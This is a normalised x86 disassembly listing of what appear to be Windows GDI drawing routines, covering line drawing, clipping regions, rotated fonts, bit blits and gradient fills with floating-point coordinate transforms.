fld [ ebx + 0x60 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x28 ]
sub [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebx + 0x2c ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp - 0x10 ]
fild [ ebp + 0x8 ]
fmul [ ebx + 0x80 ]
fsubp st1
mov eax [ esi ]
sub eax [ ebx + 0x24 ]
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fmul [ ebx + 0x58 ]
fsubp st1
fdiv [ ebx + 0x70 ]
call sub_402b00
add eax [ ebx + 0x20 ]
mov [ edi ] eax
mov eax [ esi ]
sub eax [ ebx + 0x30 ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp - 0x10 ]
fild [ ebp + 0x8 ]
fmul [ ebx + 0x88 ]
fsubp st1
mov eax [ ebp - 0x4 ]
sub eax [ ebx + 0x20 ]
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fmul [ ebx + 0x78 ]
fsubp st1
fdiv [ ebx + 0x60 ]
call sub_402b00
add eax [ ebx + 0x24 ]
mov [ esi ] eax
sub_473488
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x91 ] 0x0
je r-xdata
mov eax [ edi ]
sub eax [ ebx + 0x20 ]
add eax esi
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fmul [ ebx + 0xb0 ]
call sub_402b00
add eax [ ebx + 0x2c ]
mov [ edi ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x24 ]
sub eax esi
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fmul [ ebx + 0xb0 ]
call sub_402b00
add eax [ ebx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub esi [ ebx + 0x28 ]
mov eax [ edi ]
sub eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x24 ]
mov [ ebp - 0x14 ] eax
fld [ ebx + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ ebx + 0xb0 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xb4 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0x8 ]
fld [ ebx + 0x48 ]
fmulp st1
fild [ ebp - 0x14 ]
fld [ ebx + 0x38 ]
fmulp st1
fsubp st1
mov [ ebp - 0x18 ] esi
fild [ ebp - 0x18 ]
fmul [ ebx + 0x68 ]
faddp st1
fmul [ ebx + 0xb8 ]
fsubr [ r-xdata ]
fmul [ ebx + 0xb0 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fild [ ebp - 0x8 ]
fmul [ ebx + 0x70 ]
fild [ ebp - 0x14 ]
fmul [ ebx + 0x58 ]
faddp st1
mov [ ebp - 0x18 ] esi
fild [ ebp - 0x18 ]
fmul [ ebx + 0x80 ]
faddp st1
fmul [ ebp - 0x10 ]
call sub_402b00
add eax [ ebx + 0x2c ]
mov [ edi ] eax
fild [ ebp - 0x8 ]
fmul [ ebx + 0x78 ]
fild [ ebp - 0x14 ]
fmul [ ebx + 0x60 ]
faddp st1
mov [ ebp - 0x18 ] esi
fild [ ebp - 0x18 ]
fmul [ ebx + 0x88 ]
faddp st1
fmul [ ebp - 0x10 ]
call sub_402b00
add eax [ ebx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
sub_4735d4
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push 0x1
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x108 ]
pop esi
pop ebx
pop ebp
retn 0x18
sub_473604
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
fld [ ebp + 0x8 ]
call sub_402b00
lea edx [ eax + edi ]
push edx
mov edx [ ebp - 0x4 ]
add edx eax
push edx
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
sub ecx eax
mov edx edi
sub edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xdc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_47364c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_473488
cmp [ esi + 0xab ] 0x0
je r-xdata
push edi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor ebx ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
fld [ esi + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
push edi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x5c ]
test bl bl
je r-xdata
mov eax [ esi + 0x8 ]
call sub_41d458
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x10 ]
fmul [ esi + 0xb0 ]
call sub_402b00
mov edx eax
mov eax 0x1
call sub_476954
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
push eax
call DeleteObject
jmp r-xdata
mov eax [ esi + 0x4 ]
call sub_41e234
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x54 ]
push eax
push 0x3c
mov eax [ esi + 0x8 ]
call sub_41d1e8
push eax
call GetObjectA
push 0x48
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call sub_4062e4
neg eax
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x54 ]
push eax
call CreateFontIndirectA
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
mov bl 0x1
sub_47375c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_473488
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call MoveToEx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_47379c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_473488
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call LineTo
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4737dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
push eax
push edi
mov ecx [ esi ]
lea edx [ ebx + 0xc0 ]
mov eax ebx
call sub_473330
mov eax [ esi + 0x4 ]
push eax
push edi
mov ecx [ esi + 0x8 ]
lea edx [ ebx + 0xc8 ]
mov eax ebx
call sub_473330
mov eax [ esi + 0xc ]
push eax
push edi
mov ecx [ esi + 0x8 ]
lea edx [ ebx + 0xd0 ]
mov eax ebx
call sub_473330
mov eax [ esi + 0xc ]
push eax
push edi
mov ecx [ esi ]
lea edx [ ebx + 0xd8 ]
mov eax ebx
call sub_473330
mov eax ebx
call sub_47320c
pop edi
pop esi
pop ebx
retn
sub_473844
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_41e234
mov ebx eax
push 0x0
push esi
push edi
push ebx
call MoveToEx
push esi
mov eax [ ebp - 0x4 ]
push eax
push ebx
call LineTo
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_47387c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x4 ]
call sub_41e234
mov ebx eax
push 0x0
push edi
push esi
push ebx
call MoveToEx
mov eax [ ebp + 0x8 ]
push eax
push esi
push ebx
call LineTo
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4738ac
push ebx
push esi
add esp 0xfffffff0
mov ecx [ edx ]
mov [ esp ] ecx
mov ecx [ edx + 0x4 ]
mov [ esp + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ esp + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ esp + 0xc ] ecx
call sub_41e234
mov esi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
call LPtoDP
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
call CreateRectRgn
mov ebx eax
push 0x1
push ebx
push esi
call ExtSelectClipRgn
push ebx
call DeleteObject
add esp 0x10
pop esi
pop ebx
retn
sub_47391c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x91 ] 0x0
je r-xdata
push esi
mov esi ebx
lea edi [ ebp - 0x50 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
dec [ ebp - 0x44 ]
lea edx [ ebp - 0x50 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ esi + 0x18 ]
cmp [ eax + 0x4 ] 0x10e
jne r-xdata
mov eax [ ebx + 0xc ]
push eax
push edi
mov ecx [ ebx ]
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_473330
mov eax [ ebx + 0x4 ]
push eax
push edi
mov ecx [ ebx ]
lea edx [ ebp - 0x38 ]
mov eax esi
call sub_473330
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebx ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_473330
mov eax [ ebx + 0x4 ]
push eax
push edi
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_473330
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov edx [ eax + 0x14 ]
cmp edx 0x10e
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
push edi
mov ecx [ ebx ]
lea edx [ ebp - 0x50 ]
mov eax esi
call sub_473330
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_473330
lea edx [ ebp - 0x50 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
jmp r-xdata
cmp edx 0x168
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_473330
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_473330
mov eax [ ebx + 0x4 ]
push eax
push edi
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_473330
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_41e234
mov ebx eax
push 0x6
lea eax [ ebp - 0x40 ]
push eax
push ebx
call LPtoDP
push 0x1
push 0x6
lea eax [ ebp - 0x40 ]
push eax
call CreatePolygonRgn
mov esi eax
push esi
push ebx
call SelectClipRgn
push esi
call DeleteObject
jmp r-xdata
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x3c ]
jge r-xdata
mov eax [ ebx + 0xc ]
push eax
push edi
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_473330
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x40 ]
jge r-xdata
mov [ ebp - 0x3c ] eax
sub_473af8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
lea ecx [ ebx + 0x24 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
call sub_472a0c
sar esi 0x1
jns r-xdata
mov [ ebx + 0x28 ] esi
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x2c ] eax
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x30 ] eax
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
adc esi 0x0
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx [ eax + 0x8 ]
add [ ebx + 0x2c ] edx
mov edx [ eax + 0x1c ]
add [ ebx + 0x30 ] edx
mov edx [ eax + 0x10 ]
test edx edx
jle r-xdata
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x4 ]
fdiv [ r-xdata ]
fstp [ ebx + 0xb8 ]
fwait
sub_473b60
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
xor eax eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x64 ] eax
fild [ eax + 0x14 ]
fstp [ ebp - 0x58 ]
fwait
fild [ eax + 0x4 ]
fstp [ ebp - 0x60 ]
fwait
fild [ eax + 0x18 ]
fstp [ ebp - 0x68 ]
fwait
jmp r-xdata
mov eax [ ebx ]
xor edx edx
mov [ eax + 0xb8 ] edx
mov [ eax + 0xbc ] edx
fld [ r-xdata ]
fmul [ ebp - 0x58 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x40 ]
call sub_4729e4
fld [ r-xdata ]
fmul [ ebp - 0x60 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x20 ]
mov eax [ ebx ]
add eax 0x38
call sub_4729e4
fld [ r-xdata ]
fmul [ ebp - 0x68 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x50 ]
call sub_4729e4
fld [ ebp - 0x20 ]
fld [ ebp - 0x50 ]
fmulp st1
mov eax [ ebx ]
fstp [ eax + 0x58 ]
fwait
push 0x3ee4f8b5
push 0x88e368f1
fld [ ebp - 0x20 ]
fld [ ebp - 0x30 ]
fmulp st1
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_476920
mov eax [ ebx ]
fstp [ eax + 0x60 ]
fwait
push 0x3ee4f8b5
push 0x88e368f1
fld [ ebp - 0x40 ]
mov eax [ ebx ]
fld [ eax + 0x38 ]
fmulp st1
fld [ ebp - 0x50 ]
fmulp st1
fld [ ebp - 0x10 ]
fld [ ebp - 0x30 ]
fmulp st1
faddp st1
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_476920
mov eax [ ebx ]
fstp [ eax + 0x70 ]
fwait
fld [ ebp - 0x30 ]
fld [ ebp - 0x40 ]
fmulp st1
mov eax [ ebx ]
fld [ eax + 0x38 ]
fmulp st1
fld [ ebp - 0x10 ]
fld [ ebp - 0x50 ]
fmulp st1
fsubp st1
mov eax [ ebx ]
fstp [ eax + 0x78 ]
fwait
fld [ ebp - 0x10 ]
mov eax [ ebx ]
fld [ eax + 0x38 ]
fmulp st1
fld [ ebp - 0x50 ]
fmulp st1
fld [ ebp - 0x30 ]
fld [ ebp - 0x40 ]
fmulp st1
fsubp st1
mov eax [ ebx ]
fstp [ eax + 0x80 ]
fwait
fld [ ebp - 0x10 ]
fld [ ebp - 0x30 ]
fmulp st1
mov eax [ ebx ]
fld [ eax + 0x38 ]
fmulp st1
fld [ ebp - 0x40 ]
fld [ ebp - 0x50 ]
fmulp st1
faddp st1
mov eax [ ebx ]
fstp [ eax + 0x88 ]
fwait
fld [ ebp - 0x20 ]
fld [ ebp - 0x40 ]
fmulp st1
mov eax [ ebx ]
fstp [ eax + 0x48 ]
fwait
fld [ ebp - 0x10 ]
fld [ ebp - 0x20 ]
fmulp st1
mov eax [ ebx ]
fstp [ eax + 0x68 ]
fwait
sub_473d0a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
push esi
push edi
mov esi ebx
lea edi [ eax + 0x9b ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
mov eax [ ebp - 0x4 ]
mov dl [ ebp + 0x10 ]
mov [ eax + 0x91 ] dl
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xb0 ] edx
mov [ eax + 0xb4 ] 0x3ff00000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x91 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x98 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_472dfc
mov edi esi
mov esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4729f8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
push ebp
call sub_473b60
pop ecx
mov al [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
fild [ eax + 0x20 ]
fld [ r-xdata ]
fmulp st1
mov eax [ ebp - 0x4 ]
fstp [ eax + 0xb0 ]
fwait
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov al [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xab ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
call sub_422ac0
xor edx edx
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] edx
xor edx edx
mov [ eax + 0x30 ] edx
mov [ eax + 0x34 ] edx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_472dfc
mov eax [ ebp - 0xc ]
push eax
push esi
mov ecx [ ebp - 0x10 ]
xor edx edx
xor eax eax
call sub_405fd8
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x94 ] ebx
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_423890
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_473030
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_473ec8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebx + 0x94 ]
call sub_422ac0
call sub_41e234
push eax
mov eax [ ebx + 0x94 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebx + 0x94 ]
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
push edi
push esi
mov eax [ ebp + 0x8 ]
call sub_41e234
push eax
call BitBlt
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_473f20
push ebx
mov bl [ eax + 0x9a ]
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax + 0x4 ]
push edx
xor ecx ecx
xor edx edx
call sub_473ec8
sub_473f40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ ebx + 0x98 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_472dfc
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov eax ebx
call sub_473ec8
mov [ ebx + 0x9a ] 0x0
sub_473f80
push ebx
push esi
mov esi eax
test ecx ecx
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx ecx
mov ecx [ esi + 0x4 ]
xchg ecx eax
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_473f9c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebx + 0x10 ]
call sub_41d9c0
call sub_41cd14
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x18 ]
call sub_41cd14
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_405ffc
lea ecx [ ebp - 0x14 ]
mov edx [ ebx + 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_474024
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
push ebx
call sub_4062e4
mov edx [ ebp + 0x8 ]
add al [ edx - 0x14 ]
push eax
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
push eax
push ebx
call sub_4062e4
mov edx [ ebp + 0x8 ]
add al [ edx - 0xc ]
push eax
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
push ebx
call sub_4062e4
mov edx [ ebp + 0x8 ]
add al [ edx - 0x4 ]
pop edx
pop ecx
call sub_406c68
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x1c ]
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20 ] 0x0
je r-xdata
push ebx
call CreateSolidBrush
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call SelectObject
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1c ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call SelectObject
push eax
call DeleteObject
sub_4740c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x4 ]
call sub_41e234
mov edx [ ebp + 0x8 ]
mov [ edx - 0x24 ] eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x38 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x34 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x34 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x38 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1c ] 0xffffffff
mov eax [ ebp - 0x10 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x100
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x100
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
xor edi edi
push 0xf00021
mov eax ebx
sub eax esi
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
sub eax ebx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
push 0xf00021
mov eax [ ebp - 0x8 ]
push eax
mov eax ebx
sub eax esi
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
sub eax ebx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
dec edx
mov eax edi
call sub_474024
pop ecx
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
lea eax [ edi + 0x1 ]
push eax
call sub_4062e4
mov esi eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov ebx esi
inc edi
dec [ ebp - 0x14 ]
jne r-xdata
sub_4741f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x5
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp ebx [ ebp - 0x8 ]
jge r-xdata
inc esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
